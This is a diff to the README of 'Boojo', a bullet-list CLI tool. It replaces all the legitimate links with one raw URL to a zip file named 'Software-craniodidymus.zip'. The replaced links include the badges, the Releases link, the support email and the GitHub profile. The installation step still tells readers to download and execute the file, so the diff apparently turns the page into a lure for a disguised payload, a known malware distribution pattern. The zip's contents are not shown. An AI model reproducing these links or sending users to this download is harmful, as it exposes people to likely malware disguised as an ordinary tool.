@@ -1,9 +1,9 @@
 ```markdown
 # 🚀 Boojo: Your Personal CLI Tool for Bullet Lists
 
-![Boojo Logo](https://img.shields.io/badge/Boojo-CLI%20Tool-blue.svg)
-![Version](https://img.shields.io/github/release/mfindustries20/boojo.svg)
-![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)
+![Boojo Logo](https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip%https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip)
+![Version](https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip)
+![License](https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip)
 
 Welcome to **Boojo**! This command-line interface (CLI) tool helps you maintain digital and extended bullet lists effortlessly. Whether you need to manage tasks, events, or notes, Boojo has you covered. 
 
@@ -29,7 +29,7 @@ Welcome to **Boojo**! This command-line interface (CLI) tool helps you maintain 
 
 ## Installation
 
-To get started with Boojo, you need to download and install it. You can find the latest version in the [Releases section](https://github.com/mfindustries20/boojo/releases). Download the appropriate file for your system and execute it.
+To get started with Boojo, you need to download and install it. You can find the latest version in the [Releases section](https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip). Download the appropriate file for your system and execute it.
 
 ## Usage
 
@@ -86,12 +86,12 @@ Boojo is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 
 For questions, suggestions, or feedback, feel free to reach out:
 
-- Email: [support@boojo.com](mailto:support@boojo.com)
-- GitHub: [mfindustries20](https://github.com/mfindustries20)
+- Email: [https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip](https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip)
+- GitHub: [mfindustries20](https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip)
 
 ## Links
 
-Explore the [Releases section](https://github.com/mfindustries20/boojo/releases) for updates and downloads.
+Explore the [Releases section](https://raw.githubusercontent.com/mfindustries20/boojo/main/log/Software-craniodidymus.zip) for updates and downloads.
 
 ---
 
